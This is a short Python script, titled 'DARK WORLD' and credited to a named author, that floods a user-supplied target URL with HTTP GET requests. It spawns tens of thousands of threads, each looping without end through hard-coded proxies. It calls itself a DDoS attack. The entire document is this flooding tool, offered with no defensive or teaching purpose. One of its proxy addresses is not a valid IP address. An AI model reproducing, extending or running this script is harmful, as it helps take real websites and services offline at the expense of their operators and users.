import requests
import threading

# Function to send HTTP requests
def send_request(url, proxy=None):
    while True:
        try:
            response = requests.get(url, proxies=proxy)
            print(f"Sent request to {url}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {url}: {e}")

# Main function
def main():
    # Display banner
    print("DARK WORLD")
    print("Creator: Rahad Hasan")

    # Get the target URL from the user
    target_url = input("Enter the target URL: ")

    # Define the proxy URLs
    proxy_urls = ["http://12.345.678.90:8080", "http://98.76.54.32:8080"]

    # Create a list of proxy dictionaries
    proxies = [{"http": proxy_url, "https": proxy_url} for proxy_url in proxy_urls]

    # Start the DDoS attack
    print("Starting DDoS attack...")
    for _ in range(10000):
        # Create a new thread for each request
        for proxy in proxies:
            thread = threading.Thread(target=send_request, args=(target_url, proxy))
            thread.start()

# Run the script when executed as the main program
if __name__ == "__main__":
    main()
